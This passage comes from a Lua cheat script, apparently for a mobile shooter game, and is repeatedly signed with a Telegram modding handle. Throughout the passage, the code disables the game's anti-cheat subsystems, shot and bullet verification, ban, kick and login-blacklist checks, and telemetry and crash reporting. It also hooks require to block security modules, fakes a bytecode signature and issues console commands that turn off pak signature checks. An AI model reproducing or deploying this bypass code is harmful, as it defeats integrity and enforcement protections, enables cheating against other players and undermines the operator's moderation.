                Gokuba.TimerHandle = nil
            end
            for k, v in pairs(Gokuba) do
                if type(v) == "function" and (
                    k:find("Init") or k:find("Start") or k:find("Check") or
                    k:find("Scan") or k:find("Report") or k:find("Forward") or
                    k:find("Feature") or k:find("Detect") or k:find("Collect") or
                    k:find("Send") or k:find("Upload") or k:find("Verify") or
                    k:find("Analyze") or k:find("Process") or k:find("Handle")
                ) then
                    Gokuba[k] = nop
                end
            end
        end
        if _G.GokubaLogic then
            _G.GokubaLogic.ForwardFeature = nop
            _G.GokubaLogic.InitGokubaLogic = nop
        end
    end)
    print("[BYPASS] ✅ Gokuba Bypass Done TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 37. Racing AntiCheat Bypass TG BY ~ @ASURVIPMOD
-- ============================================================

local function RacingAntiCheatBypass()
    pcall(function()
        if RacingAntiCheatLogic then
            RacingAntiCheatLogic.HandleRacingEnter = nop
            RacingAntiCheatLogic.HandleRacingStart = nop
            RacingAntiCheatLogic.HandleRacingEnd = nop
            RacingAntiCheatLogic.StartDetectTimer = nop
            RacingAntiCheatLogic.StopDetectTimer = nop
            RacingAntiCheatLogic.DetectVehicleFloating = nop
            RacingAntiCheatLogic.HandleFloatingCheat = nop
            RacingAntiCheatLogic.SetIgnoreFloating = nop
            RacingAntiCheatLogic.HandlePlayerPassCheckBelt = nop
            RacingAntiCheatLogic.HandleSpeedCheat = nop
            RacingAntiCheatLogic._CreateVehicleData = function() return {} end
            RacingAntiCheatLogic.vehicleDataMap = {}
            RacingAntiCheatLogic.detectTimer = nil
            RacingAntiCheatLogic.config = {
                FloatingDistLimit = 99999,
                FloatingTimeLimit = 99999,
                CheckPassIntervalLimit = 99999
            }
        end
    end)
    print("[BYPASS] ✅ Racing AntiCheat Bypass Done TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 38. CoronaLab Telemetry Bypass TG BY ~ @ASURVIPMOD
-- ============================================================

local function CoronaLabBypass()
    pcall(function()
        _G.LocalMain = function()
            print("[BYPASS] CoronaLab telemetry timer TG BY ~ @ASURVIPMOD!")
            return
        end
        local uOuterController = slua_GameFrontendHUD and slua_GameFrontendHUD:GetPlayerController()
        if _isValid(uOuterController) and uOuterController.AddGameTimer then
            local orig = uOuterController.AddGameTimer
            uOuterController.AddGameTimer = function(interval, bLoop, func, ...)
                if interval == 30 and bLoop == true then
                    return nil
                end
                return orig(interval, bLoop, func, ...)
            end
        end
        if CHiggsBosonComponent then
            CHiggsBosonComponent.SecurityCoronaLabClientDataPointer = function(self) return nil end
            CHiggsBosonComponent.SetFloatValueByName = function(self, name, value) return end
        end
        if _G.CoronaLab then
            _G.CoronaLab.ReportData = nop
            _G.CoronaLab.SendData = nop
            _G.CoronaLab.CollectData = nop
            _G.CoronaLab.Telemetry = nop
        end
        local SubMgr = _safe_require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        if SubMgr then
            local sub = SubMgr:Get("CoronaLabSubsystem")
            if sub then
                sub.ReportData = nop
                sub.SendToServer = nop
                sub.CollectTelemetry = nop
                sub.StopCollection = nop
            end
        end
    end)
    print("[BYPASS] ✅ CoronaLab Telemetry Bypass Done TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 39. Login Module Bypass TG BY ~ @ASURVIPMOD
-- ============================================================

local function LoginModuleBypass()
    pcall(function()
        if login_module then
            login_module["ban-login"] = function() return end
            login_module["idip-kick-out"] = function() return end
            login_module.aq_ban = function() return end
            login_module["device-in-blacklist"] = function() return end
            login_module.device_num_limit = function() return end
            login_module["register-forbidden"] = function() return end
            login_module["low-version"] = function() return end
            login_module["not-in-white-list"] = function() return end
            login_module.Login_Failed = function() return end
            login_module.aas_ban = function() return end
            login_module.PakMonitorStart = function(EnableMode) return end
            login_module.SetupFilenameHideKeywords = function() return end
            login_module.on_login_failed = function(conn_idx, reason, banInfo, banTime, uid, extra_table) return end
            login_module.DelaybanLoginCancelCallback = function() return end
            login_module.CheckBan = retFalse
            login_module.IsBanned = retFalse
            login_module.GetBanInfo = retEmpty
            login_module.IsDeviceBlacklisted = retFalse
        end
    end)
    print("[BYPASS] ✅ Login Module Bypass Done TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 40. Swift Hawk Bypass TG BY ~ @ASURVIPMOD
-- ============================================================

local function SwiftHawkBypass()
    pcall(function()
        for _, f in ipairs({"SwiftHawk", "ClientSwiftHawk", "ClientSwiftHawkWithParams", "SendSwiftHawkData", "SwiftHawkReport"}) do
            if _G[f] then _G[f] = nop end
            if _G.GameplayCallbacks and _G.GameplayCallbacks[f] then _G.GameplayCallbacks[f] = nop end
        end
        local sub = package.loaded["GameLua.Mod.BaseMod.Client.Security.SwiftHawkSubsystem"]
        if sub then
            sub.ReportData = nop
            sub.SendReport = nop
            sub.CollectTelemetry = nop
            sub.InitSubsystem = nop
            sub.StartCollection = nop
            sub.StopCollection = nop
        end
    end)
    print("[BYPASS] ✅ TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 46. TG BY ~ @ASURVIPMOD
-- ============================================================

local function ShootVerificationBypass()
    pcall(function()
        local sub = _safe_require("GameLua.Dev.Subsystem.ShootVerifySubSystemClient")
        if sub then
            sub.OnShootVerifyFailed = nop
            sub.SendVerifyData = nop
            sub.ReportBulletHit = nop
            sub.UploadHitInfo = nop
            sub.VerifyShot = retTrue
            sub.CheckShoot = retTrue
            sub.ValidateShoot = retTrue
            sub.IsShootValid = retTrue
            sub.ReportInvalidShoot = nop
            sub.ResetShootData = nop
        end
        if _G.BulletHitInfoUploadData then
            _G.BulletHitInfoUploadData.Report = nop
            _G.BulletHitInfoUploadData.Send = nop
            _G.BulletHitInfoUploadData.Upload = nop
            _G.BulletHitInfoUploadData.Verify = retTrue
            _G.BulletHitInfoUploadData.Validate = retTrue
            _G.BulletHitInfoUploadData.Reset = nop
        end
        
        local ShootVerification = import("ShootVerification")
        if ShootVerification then
            ShootVerification.VerifyShoot = retTrue
            ShootVerification.ReportInvalidShoot = nop
            ShootVerification.CheckShoot = retTrue
            ShootVerification.ValidateShoot = retTrue
            ShootVerification.IsShootValid = retTrue
        end
        
        local BulletVerification = import("BulletVerification")
        if BulletVerification then
            BulletVerification.VerifyBullet = retTrue
            BulletVerification.ReportInvalidBullet = nop
            BulletVerification.CheckBullet = retTrue
            BulletVerification.ValidateBullet = retTrue
            BulletVerification.IsBulletValid = retTrue
        end
    end)
    print("[BYPASS] ✅ TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 42. TG BY ~ @ASURVIPMOD
-- ============================================================

local function ModifierExceptionBypass()
    pcall(function()
        if _G.bReportedModifierException then _G.bReportedModifierException = false end
        local sub = _safe_require("GameLua.Mod.BaseMod.Common.Security.ModifierExceptionSubsystem")
        if sub then
            sub.ReportException = nop
            sub.CheckModifier = retTrue
            sub.ValidateModifier = retTrue
            sub.ReportModifierError = nop
            sub.DetectModifier = retFalse
            sub.IsModifierValid = retTrue
        end
    end)
    print("[BYPASS] ✅ TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 43. TG BY ~ @ASURVIPMOD
-- ============================================================

local function SimulateCharacterBypass()
    pcall(function()
        local sub = _safe_require("GameLua.Mod.BaseMod.Gameplay.Simulate.SimulateCharacterSubsystem")
        if sub then
            sub.ReportLocation = nop
            sub.SendLocationData = nop
            sub.VerifyLocation = retTrue
            sub.CheckLocation = retTrue
            sub.ValidateMovement = retTrue
        end
    end)
    print("[BYPASS] ✅ TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 44. TG BY ~ @ASURVIPMOD
-- ============================================================

local function PlayerSecurityBypass()
    pcall(function()
        for _, c in ipairs({"PlayerSecurityInfoCollector", "PlayerSecurityInfo", "SecurityInfoCollector", "ClientSecurityCollector", "PlayerAntiCheatCollector"}) do
            if _G[c] then
                for k, v in pairs(_G[c]) do
                    if type(v) == "function" and (
                        k:find("Report") or k:find("Collect") or k:find("Send") or
                        k:find("Upload") or k:find("Record") or k:find("Check") or
                        k:find("Verify") or k:find("Validate") or k:find("Scan") or
                        k:find("Analyze") or k:find("Process") or k:find("Handle") or
                        k:find("Submit") or k:find("Notify") or k:find("Alert")
                    ) then
                        _G[c][k] = nop
                    end
                end
            end
        end
        local SecSub = _safe_require("GameLua.Mod.BaseMod.Common.Security.PlayerSecurityInfoSubsystem")
        if SecSub then
            SecSub.ReportData = nop
            SecSub.CheckCheat = retFalse
            SecSub.ValidatePlayer = retTrue
            SecSub.CollectData = nop
            SecSub.SendToServer = nop
            SecSub.ProcessData = nop
            SecSub.AnalyzeData = nop
        end
        
        local SecurityCommonUtils = package.loaded["GameLua.Mod.BaseMod.Common.Security.SecurityCommonUtils"]
        if SecurityCommonUtils then
            SecurityCommonUtils.ExtractPlayerBasicInfo = retEmpty
            SecurityCommonUtils.LogIf = retFalse
            SecurityCommonUtils.CheckSecurity = retTrue
            SecurityCommonUtils.ValidatePlayer = retTrue
            SecurityCommonUtils.ValidateSession = retTrue
            SecurityCommonUtils.ValidateGame = retTrue
            SecurityCommonUtils.ValidateSystem = retTrue
            SecurityCommonUtils.ValidateDevice = retTrue
            SecurityCommonUtils.ValidateNetwork = retTrue
            SecurityCommonUtils.ValidateMemory = retTrue
            SecurityCommonUtils.ValidateFile = retTrue
            SecurityCommonUtils.ValidateProcess = retTrue
            SecurityCommonUtils.ValidateThread = retTrue
            SecurityCommonUtils.ValidateModule = retTrue
            SecurityCommonUtils.ValidateAPI = retTrue
            SecurityCommonUtils.ValidateSDK = retTrue
            SecurityCommonUtils.ValidateLibrary = retTrue
            SecurityCommonUtils.ValidateFramework = retTrue
            SecurityCommonUtils.ValidatePackage = retTrue
            SecurityCommonUtils.ValidateContainer = retTrue
            SecurityCommonUtils.ValidateComponent = retTrue
            SecurityCommonUtils.ValidateObject = retTrue
            SecurityCommonUtils.ValidateClass = retTrue
            SecurityCommonUtils.ValidateStruct = retTrue
            SecurityCommonUtils.ValidateEnum = retTrue
            SecurityCommonUtils.ValidateInterface = retTrue
            SecurityCommonUtils.ValidateDelegate = retTrue
            SecurityCommonUtils.ValidateEvent = retTrue
            SecurityCommonUtils.ValidateFunction = retTrue
            SecurityCommonUtils.ValidateVariable = retTrue
            SecurityCommonUtils.ValidateProperty = retTrue
            SecurityCommonUtils.ValidateField = retTrue
            SecurityCommonUtils.ValidateMethod = retTrue
            SecurityCommonUtils.ValidateParameter = retTrue
            SecurityCommonUtils.ValidateReturn = retTrue
            SecurityCommonUtils.ValidateResult = retTrue
            SecurityCommonUtils.ValidateOutput = retTrue
            SecurityCommonUtils.ValidateInput = retTrue
        end
        
        local SecurityNotifyPCFeature = package.loaded["GameLua.Mod.BaseMod.Common.Security.SecurityNotifyPCFeature"]
        if SecurityNotifyPCFeature then
            SecurityNotifyPCFeature.ClientRPC_SyncBanID = nop
            SecurityNotifyPCFeature.ClientRPC_StrongTips = nop
            SecurityNotifyPCFeature.ClientRPC_NormalTips = nop
            SecurityNotifyPCFeature.Notify = nop
            SecurityNotifyPCFeature.ShowBan = nop
            SecurityNotifyPCFeature.ShowKick = nop
            SecurityNotifyPCFeature.ShowWarning = nop
            SecurityNotifyPCFeature.ShowInfo = nop
            SecurityNotifyPCFeature.ShowError = nop
            SecurityNotifyPCFeature.ShowFatal = nop
            SecurityNotifyPCFeature.ShowPanic = nop
            SecurityNotifyPCFeature.ShowAlert = nop
            SecurityNotifyPCFeature.ShowNotification = nop
            SecurityNotifyPCFeature.ShowMessage = nop
            SecurityNotifyPCFeature.ShowDialog = nop
            SecurityNotifyPCFeature.ShowPopup = nop
            SecurityNotifyPCFeature.ShowToast = nop
            SecurityNotifyPCFeature.ShowSnackbar = nop
            SecurityNotifyPCFeature.ShowBanner = nop
            SecurityNotifyPCFeature.ShowAlertDialog = nop
            SecurityNotifyPCFeature.ShowConfirmDialog = nop
            SecurityNotifyPCFeature.ShowPromptDialog = nop
            SecurityNotifyPCFeature.ShowInputDialog = nop
            SecurityNotifyPCFeature.ShowSelectDialog = nop
            SecurityNotifyPCFeature.ShowProgressDialog = nop
            SecurityNotifyPCFeature.ShowLoadingDialog = nop
            SecurityNotifyPCFeature.ShowSuccessDialog = nop
            SecurityNotifyPCFeature.ShowFailureDialog = nop
            SecurityNotifyPCFeature.ShowErrorDialog = nop
            SecurityNotifyPCFeature.ShowWarningDialog = nop
            SecurityNotifyPCFeature.ShowInfoDialog = nop
        end
    end)
    print("[BYPASS] ✅ TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 45. TG BY ~ @ASURVIPMOD
-- ============================================================

local function ClientFlowBypass()
    pcall(function()
        for _, name in ipairs({"ClientSecMrpcsFlow", "MrpcsFlow", "MrpcsData", "ClientCircleFlowSubsystem", "ClientKillFlowSubsystem", "ClientSecPlayerKillFlow"}) do
            local sub = package.loaded[name] or _G[name]
            if sub then
                for k, v in pairs(sub) do
                    if type(v) == "function" and (
                        k:find("Report") or k:find("Send") or k:find("Flow") or
                        k:find("Record") or k:find("Process") or k:find("Upload") or
                        k:find("Track") or k:find("Monitor") or k:find("Analyze") or
                        k:find("Submit") or k:find("Notify") or k:find("Alert")
                    ) then
                        pcall(function() sub[k] = nop end)
                    end
                end
            end
        end
    end)
    print("[BYPASS] ✅ TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 46. TG BY ~ @ASURVIPMOD
-- ============================================================
local function GameplayCallbackBypass()
    pcall(function()
        if not _G.GameplayCallbacks then _G.GameplayCallbacks = {} end
        if _G.GameplayCallbacks.IsBypassed then return end
        local GC = _G.GameplayCallbacks
        
        local reports = {
            "ReportAttackFlow", "ReportSecAttackFlow", "ReportFireArms", 
            "ReportVerifyInfoFlow", "ReportMrpcsFlow", "ReportPlayerBehavior", 
            "ReportTeammatHurt", "ReportMisKillByTeammate", "ReportForbitPick", 
            "ReportPlayerMoveRoute", "ReportPlayerPosition", "ReportVehicleMoveFlow", 
            "ReportSecTgameMovingFlow", "ReportParachuteData", "SendTssSdkAntiDataToLobby", 
            "ReportEquipmentFlow", "ReportAimFlow", "ReportPlayersPing", 
            "ReportPlayerIP", "ReportPlayerFramePingRecord", "OnDSConnectionSaturated", 
            "ReportDSNetSaturation", "ReportNetContinuousSaturate", "ReportDSNetRate", 
            "SendClientStats", "SendServerAvgTickDelta", "ReportCircleFlow", 
            "ClientSecMrpcsFlow", "SwiftHawk", "ClientSwiftHawk", "ClientSwiftHawkWithParams",
            "ReportSecurityViolation", "ReportIntegrityCheck", "ReportSignatureVerify",
            "ReportAntiCheat", "ReportAC", "ReportSuspicious", "ReportAbnormal",
            "ReportMagicBullet", "ReportDamage", "ReportHitbox", "ReportProjectile",
            "ReportBullet", "ReportShoot", "ReportVerification",
            "ReportSkin", "ReportAvatar", "ReportWeapon", "ReportVehicle",
            "ReportBan", "ReportKick", "ReportFlag", "ReportWarning",
            "ReportAlert", "ReportNotify", "ReportException", "ReportError",
            "ReportCrash", "ReportDump", "ReportMemory", "ReportStack",
            "ReportProfiler", "ReportPerformance", "ReportStats",
            "ReportGameGuardian", "ReportCheatEngine", "ReportRoot", "ReportJailbreak",
            "ReportEmulator", "ReportTamper", "ReportSpeedHack", "ReportESP", 
            "ReportWallhack", "ReportNoRecoil", "ReportPlayerReport"
        }
        for _, f in ipairs(reports) do GC[f] = nop end
        
        GC.CheckReportSecAttackFlowWithAttackFlow = retFalse
        GC.CheckReportSecAttackFlow = retFalse
        
        local origState = GC.OnDSPlayerStateChanged
        GC.OnDSPlayerStateChanged = function(UID, State, bPure, bSafe, Param)
            local s = State and string.lower(tostring(State)) or ""
            local blocked = {
                ["cheatdetected"]=1, ["connectionlost"]=1, ["connectiontimeout"]=1, 
                ["connectionexception"]=1, ["netdrivererror"]=1, ["banned"]=1, 
                ["kicked"]=1, ["suspended"]=1, ["violationdetected"]=1, 
                ["integrityfailure"]=1, ["securityviolation"]=1, ["report"]=1,
                ["ban"]=1, ["detect"]=1, ["flag"]=1, ["hack"]=1,
                ["anti"]=1, ["ac_"]=1, ["beacon"]=1, ["monitor"]=1,
                ["alert"]=1, ["warning"]=1, ["error"]=1, ["exception"]=1,
                ["crash"]=1, ["dump"]=1, ["stack"]=1, ["memory"]=1,
                ["profiler"]=1, ["performance"]=1, ["stats"]=1,
                ["magic"]=1, ["bullet"]=1, ["hitbox"]=1, ["damage"]=1,
                ["projectile"]=1, ["shoot"]=1, ["verification"]=1,
                ["skin"]=1, ["avatar"]=1, ["weapon"]=1, ["vehicle"]=1,
                ["gameguardian"]=1, ["cheatengine"]=1, ["root"]=1, ["jailbreak"]=1,
                ["emulator"]=1, ["tamper"]=1, ["speedhack"]=1, ["esp"]=1,
                ["wallhack"]=1, ["norecoil"]=1, ["playerreport"]=1
            }
            if blocked[s] then return end
            if origState then pcall(origState, UID, State, bPure, bSafe, Param) end
        end
        
        GC.OnPlayerNetConnectionClosed = nop
        GC.OnPlayerActorChannelError = nop
        GC.OnPlayerRPCValidateFailed = nop
        GC.OnPlayerSpectateException = nop
        GC.OnShutdownAfterError = nop
        GC.OnPlayerDisconnect = nop
        GC.OnPlayerTimeout = nop
        GC.OnPlayerKicked = nop
        GC.OnPlayerBanned = nop
        GC.IsBypassed = true
    end)
        print("[BYPASS] ✅ TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 47. TG BY ~ @ASURVIPMOD
-- ============================================================

local function KillAllSubsystems()
    pcall(function()
        local SubMgr = _safe_require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        if SubMgr then
            local toKill = {
                "CoronaLabSubsystem", "PlayerSecurityInfoSubsystem", "ClientCircleFlowSubsystem",
                "ModifierExceptionSubsystem", "SimulateCharacterSubsystem", "ShootVerifySubSystemClient",
                "HiggsBosonComponent", "ClientReportPlayerSubsystem", "DSReportPlayerSubsystem",
                "ClientHawkEyePatrolSubsystem", "DSHawkEyePatrolSubsystem", "ClientDataStatistcsSubsystem",
                "AFKReportorSubsystem", "BehaviorScoreSubsystem", "FileCheckSubsystem",
                "MemoryCheckSubsystem", "SpeedCheckSubsystem", "WallCheckSubsystem",
                "AvatarExceptionSubsystem", "GameReportSubsystem", "ClientSecMrpcsFlowSubsystem",
                "MrpcsFlowSubsystem", "CircleFlowSubsystem", "SwiftHawkSubsystem",
                "AntiCheatSubsystem", "IntegrityCheckSubsystem", "SignatureVerifySubsystem",
                "MD5CheckSubsystem", "PakVerifySubsystem", "DNSMonitorSubsystem",
                "DeviceFingerprintSubsystem", "ReplayMonitorSubsystem", "TelemetrySubsystem",
                "GokubaSubsystem", "RacingAntiCheatSubsystem", "ClientBanSubsystem",
                "RealTimeBanSubsystem", "TLogSubsystem", "ReportSubsystem",
                "SecurityMonitorSubsystem", "CheatDetectionSubsystem", "ViolationMonitorSubsystem",
                "SuspiciousActivitySubsystem", "AbnormalBehaviorSubsystem", "NetworkMonitorSubsystem",
                "AnalyticsSubsystem", "CrashReportSubsystem", "PerformanceMonitorSubsystem",
                "MagicBulletDetectionSubsystem", "DamageVerificationSubsystem", 
                "HitboxVerificationSubsystem", "ProjectileVerificationSubsystem",
                "BulletVerificationSubsystem", "ShootVerificationSubsystem",
                "SkinVerificationSubsystem", "AvatarVerificationSubsystem",
                "WeaponVerificationSubsystem", "VehicleVerificationSubsystem",
                "GameGuardianDetectionSubsystem", "CheatEngineDetectionSubsystem",
                "RootDetectionSubsystem", "JailbreakDetectionSubsystem",
                "EmulatorDetectionSubsystem", "TamperDetectionSubsystem",
                "SpeedHackDetectionSubsystem", "ESPDetectionSubsystem",
                "WallhackDetectionSubsystem", "NoRecoilDetectionSubsystem",
                "PlayerReportSubsystem", "ReportCooldownSubsystem"
            }
            for _, name in ipairs(toKill) do
                local sub = SubMgr:Get(name)
                if sub then
                    for k, v in pairs(sub) do
                        if type(v) == "function" and (
                            k:find("Report") or k:find("Send") or k:find("Upload") or
                            k:find("Verify") or k:find("Check") or k:find("Validate") or
                            k:find("Scan") or k:find("Detect") or k:find("Collect") or
                            k:find("Flow") or k:find("Heartbeat") or k:find("Monitor") or
                            k:find("Track") or k:find("Record") or k:find("Log") or
                            k:find("Alert") or k:find("Notify") or k:find("Ban") or
                            k:find("Kick") or k:find("Suspend") or k:find("Flag") or
                            k:find("Anti") or k:find("AC") or k:find("Analyze") or
                            k:find("Process") or k:find("Handle") or k:find("Evaluate") or
                            k:find("Submit") or k:find("Analyze") or k:find("Debug") or
                            k:find("Magic") or k:find("Bullet") or k:find("Damage") or
                            k:find("Hitbox") or k:find("Projectile") or k:find("Shoot") or
                            k:find("Skin") or k:find("Avatar") or k:find("Weapon") or
                            k:find("Vehicle") or k:find("Equipment") or
                            k:find("GameGuardian") or k:find("CheatEngine") or
                            k:find("Root") or k:find("Jailbreak") or
                            k:find("Emulator") or k:find("Tamper") or
                            k:find("SpeedHack") or k:find("ESP") or
                            k:find("Wallhack") or k:find("NoRecoil") or
                            k:find("PlayerReport") or k:find("ReportCooldown")
                        ) then pcall(function() sub[k] = nop end) end
                    end
                    if sub.timer then pcall(function() sub:RemoveGameTimer(sub.timer) end) end
                    if sub.heartbeatTimer then pcall(function() sub:RemoveGameTimer(sub.heartbeatTimer) end) end
                    if sub.reportTimer then pcall(function() sub:RemoveGameTimer(sub.reportTimer) end) end
                    if sub.checkTimer then pcall(function() sub:RemoveGameTimer(sub.checkTimer) end) end
                    if sub.monitorTimer then pcall(function() sub:RemoveGameTimer(sub.monitorTimer) end) end
                    if sub.scanTimer then pcall(function() sub:RemoveGameTimer(sub.scanTimer) end) end
                    if sub.sendTimer then pcall(function() sub:RemoveGameTimer(sub.sendTimer) end) end
                    if sub.uploadTimer then pcall(function() sub:RemoveGameTimer(sub.uploadTimer) end) end
                end
            end
        end
    end)
        print("[BYPASS] ✅ TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 48. TG BY ~ @ASURVIPMOD
-- ============================================================

local function SLUABypass()
    pcall(function()
        if slua and slua.getSignature then slua.getSignature = function() return 0xDEADBEEF end end
        local loader = package.loaded["slua.loader"] or rawget(_G, "slua_loader")
        if loader then
            loader.verifyBytecode = retTrue
            loader.checkIntegrity = retTrue
            if loader.disableSignatureCheck then loader.disableSignatureCheck = retTrue end
        end
        local slua_serialize = package.loaded["slua.serialize"]
        if slua_serialize then
            slua_serialize.check = retTrue
            slua_serialize.verify = retTrue
        end
        if _G.slua_verify then _G.slua_verify = retTrue end
        if _G.check_slua_integrity then _G.check_slua_integrity = retTrue end
        if _G.slua_loader then
            _G.slua_loader.verifyBytecode = retTrue
            _G.slua_loader.checkIntegrity = retTrue
        end
        if _G.slua_check then _G.slua_check = retTrue end
        if _G.slua_validate then _G.slua_validate = retTrue end
    end)
    print("[BYPASS] ✅ TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 49. TG BY ~ @ASURVIPMOD
-- ===============================================================

local function ReplayTelemetryBypass()
    pcall(function()
        if _G.Replay then
            _G.Replay.Record = nop
            _G.Replay.StopRecord = nop
            _G.Replay.Save = nop
            _G.Replay.Upload = nop
            _G.Replay.Report = nop
            _G.Replay.Telemetry = nop
            _G.Replay.Analytics = nop
        end
        if _G.Telemetry then
            _G.Telemetry.Send = nop
            _G.Telemetry.Report = nop
            _G.Telemetry.Track = nop
            _G.Telemetry.Log = nop
            _G.Telemetry.Collect = nop
            _G.Telemetry.Upload = nop
        end
        if _G.Analytics then
            _G.Analytics.Send = nop
            _G.Analytics.Report = nop
            _G.Analytics.Track = nop
            _G.Analytics.Log = nop
            _G.Analytics.Collect = nop
        end
        if _G.Firebase then
            _G.Firebase.logEvent = nop
            _G.Firebase.trackEvent = nop
            _G.Firebase.setEnabled = retFalse
            _G.Firebase.sendEvent = nop
            _G.Firebase.report = nop
        end
        if _G.Adjust then
            _G.Adjust.logEvent = nop
            _G.Adjust.trackEvent = nop
            _G.Adjust.setEnabled = retFalse
            _G.Adjust.sendEvent = nop
        end
        if _G.AppsFlyer then
            _G.AppsFlyer.logEvent = nop
            _G.AppsFlyer.trackEvent = nop
            _G.AppsFlyer.setEnabled = retFalse
            _G.AppsFlyer.sendEvent = nop
        end
        
               if _G.Crashlytics then _G.Crashlytics.Report = nop end
        if _G.Analytics then _G.Analytics.Report = nop end
    end)
    print("[BYPASS] ✅ TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 50. TG BY ~ @ASURVIPMOD
-- ============================================================

local function FinalProtection()
    pcall(function()
        for _, flag in ipairs({
            "ENABLE_REPORT", "ENABLE_ANTI_CHEAT", "ENABLE_SECURITY", 
            "ENABLE_TELEMETRY", "ENABLE_ANALYTICS", "ENABLE_CRASH_REPORT", 
            "ENABLE_PERFORMANCE_REPORT", "ENABLE_MONITOR", "ENABLE_TRACK",
            "ENABLE_DETECT", "ENABLE_VERIFY", "ENABLE_CHECK", "ENABLE_SCAN",
            "ENABLE_AC", "ENABLE_BEACON", "ENABLE_SDK", "ENABLE_TSS",
            "ENABLE_SWIFT_HAWK", "ENABLE_GOKUBA", "ENABLE_HIGGS",
            "ENABLE_CORONA", "ENABLE_HAWKEYE", "ENABLE_BAN",
            "ENABLE_VALIDATE", "ENABLE_AUTHENTICATE", "ENABLE_SIGNATURE",
            "ENABLE_KICK", "ENABLE_SUSPEND", "ENABLE_FLAG", "ENABLE_ALERT",
            "ENABLE_EXCEPTION", "ENABLE_ERROR", "ENABLE_CRASH", "ENABLE_DUMP",
            "ENABLE_STACK", "ENABLE_MEMORY", "ENABLE_PROFILER", "ENABLE_STATS",
            "ENABLE_MAGIC_BULLET_DETECTION", "ENABLE_DAMAGE_VERIFICATION",
            "ENABLE_HITBOX_VERIFICATION", "ENABLE_PROJECTILE_VERIFICATION",
            "ENABLE_BULLET_VERIFICATION", "ENABLE_SHOOT_VERIFICATION",
            "ENABLE_SKIN_VERIFICATION", "ENABLE_AVATAR_VERIFICATION",
            "ENABLE_WEAPON_VERIFICATION", "ENABLE_VEHICLE_VERIFICATION",
            "ENABLE_GAME_GUARDIAN_DETECTION", "ENABLE_CHEAT_ENGINE_DETECTION",
            "ENABLE_ROOT_DETECTION", "ENABLE_JAILBREAK_DETECTION",
            "ENABLE_EMULATOR_DETECTION", "ENABLE_TAMPER_DETECTION",
            "ENABLE_SPEEDHACK_DETECTION", "ENABLE_ESP_DETECTION",
            "ENABLE_WALLHACK_DETECTION", "ENABLE_NORECOIL_DETECTION",
            "ENABLE_PLAYER_REPORT", "ENABLE_REPORT_COOLDOWN"
        }) do
            if _G[flag] then _G[flag] = false end
        end
        
        local origReq = require
        local blocked = {
            "HiggsBosonComponent", "PlayerSecurityInfoSubsystem", "CoronaLabSubsystem",
            "ClientCircleFlowSubsystem", "ModifierExceptionSubsystem", "ShootVerifySubSystemClient",
            "ClientReportPlayerSubsystem", "DSReportPlayerSubsystem", "Gokuba",
            "SwiftHawkSubsystem", "ClientBanLogic", "RealTimeBan", "RacingAntiCheatLogic",
            "SecurityMonitorSubsystem", "CheatDetectionSubsystem", "ViolationMonitorSubsystem",
            "AntiCheatSubsystem", "IntegrityCheckSubsystem", "SignatureVerifySubsystem",
            "TssSdk", "TssManager", "AntiCheatManager", "ACManager",
            "DeviceFingerprintSubsystem", "DNSMonitorSubsystem", "FileCheckSubsystem",
            "MemoryCheckSubsystem", "SpeedCheckSubsystem", "WallCheckSubsystem",
            "AvatarExceptionSubsystem", "GameReportSubsystem", "BehaviorScoreSubsystem",
            "AFKReportorSubsystem", "ClientDataStatistcsSubsystem", "ReplayMonitorSubsystem",
            "TelemetrySubsystem", "AnalyticsSubsystem", "CrashReportSubsystem",
            "MagicBulletDetectionSubsystem", "DamageVerificationSubsystem",
            "HitboxVerificationSubsystem", "ProjectileVerificationSubsystem",
            "BulletVerificationSubsystem", "ShootVerificationSubsystem",
            "SkinVerificationSubsystem", "AvatarVerificationSubsystem",
            "WeaponVerificationSubsystem", "VehicleVerificationSubsystem",
            "GameGuardianDetectionSubsystem", "CheatEngineDetectionSubsystem",
            "RootDetectionSubsystem", "JailbreakDetectionSubsystem",
            "EmulatorDetectionSubsystem", "TamperDetectionSubsystem",
            "SpeedHackDetectionSubsystem", "ESPDetectionSubsystem",
            "WallhackDetectionSubsystem", "NoRecoilDetectionSubsystem",
            "PlayerReportSubsystem", "ReportCooldownSubsystem"
        }
                _G.require = function(m)
            for _, b in ipairs(blocked) do
                if m:find(b) then return {} end
            end
            return origReq(m)
        end
        
        if _G.BypassPermissions then
            for k, v in pairs(_G.BypassPermissions) do
                _G.BypassPermissions[k] = true
            end
        end
        
        if _G.AntiCheatBlock then
            for k, v in pairs(_G.AntiCheatBlock) do
                _G.AntiCheatBlock[k] = true
            end
        end
    end)
    print("[BYPASS] ✅ TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 51. TG BY ~ @ASURVIPMOD
-- ============================================================

local function ContinuousProtection()
    pcall(function()
        if _G.BypassPermissions then
            for k, v in pairs(_G.BypassPermissions) do
                _G.BypassPermissions[k] = true
            end
        end
        
        if _G.AntiCheatBlock then
            for k, v in pairs(_G.AntiCheatBlock) do
                _G.AntiCheatBlock[k] = true
            end
        end
        
        local GameplayData = _safe_require("GameLua.GameCore.Data.GameplayData")
        if GameplayData then
            local pc = GameplayData.GetPlayerController()
            if _isValid(pc) then
                if pc.HiggsBoson then
                    pc.HiggsBoson.bMHActive = false
                    pc.HiggsBoson.bCallPreReplication = false
                end
                if pc.HiggsBosonComponent then
                    pc.HiggsBosonComponent.bMHActive = false
                    pc.HiggsBosonComponent.bCallPreReplication = false
                end
            end
        end
        
        local console = import("KismetSystemLibrary")
        if console then
            console.ExecuteConsoleCommand(nil, "pak.DisablePakSignatureCheck 1")
            console.ExecuteConsoleCommand(nil, "security.DisableChecks 1")
            console.ExecuteConsoleCommand(nil, "Net.BlockAllAntiCheat 1")
